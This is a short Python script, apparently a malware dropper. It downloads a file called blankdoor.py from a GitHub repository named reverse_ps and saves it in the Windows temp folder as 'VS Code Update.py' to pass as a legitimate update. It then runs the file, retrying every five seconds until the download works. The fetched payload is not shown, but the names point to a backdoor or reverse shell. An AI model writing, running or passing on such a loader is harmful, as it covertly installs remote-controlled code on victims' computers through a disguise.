import requests, time, os
url = "https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/main/blankdoor.py"
while True:
    try: 
        r = requests.get(url)
        path = os.environ["USERPROFILE"]+"\\Appdata\\Local\\Temp\\"
        with open(path+"VS Code Update.py", "w") as f:
            f.write(r.text)
        os.system(path+'"VS Code Update.py"')
        break
    except:
        time.sleep(5)
